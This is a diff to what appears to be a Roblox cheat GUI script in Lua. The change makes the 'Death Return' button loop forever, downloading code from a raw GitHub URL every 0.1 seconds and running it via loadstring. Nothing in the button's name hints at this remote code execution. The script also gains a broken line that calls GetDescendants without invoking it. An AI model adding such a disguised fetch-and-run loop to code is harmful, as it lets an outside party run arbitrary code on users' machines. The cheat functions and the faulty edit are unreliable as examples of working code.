@@ -269,11 +269,11 @@ sectiones2:addButton("Max Camera Zoom", function()
 	game.Players.LocalPlayer.CameraMaxZoomDistance = 1000000000000
 end)
 
-sectiones2:addButton("Add colide trees", function()
-	game:GetService("ReplicatedStorage").NoCollideTrees.Parent = game.Workspace
+sectiones2:addButton("Add no colide trees", function()
+	game:GetService("ReplicatedStorage").NoCollideTrees:GetDescendants
 end)
 
-sectiones2:addButton("No colide trees", function()
+sectiones2:addButton("Remove no colide trees", function()
 	game:GetService("Workspace").NoCollideTrees.Parent = game.ReplicatedStorage
 end)
 
@@ -436,8 +436,12 @@ end)
 
 
 Scripts:addButton("Death Return", function()
-game.Players.LocalPlayer.Character.DeathReturn:Destroy()
+while true do
+    wait(0.1)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/death"))('death is such a noob :)')
+end
 end)
+
 Scripts:addButton("Player Died Alerts", function()
 local players = game:GetService("Players")
 
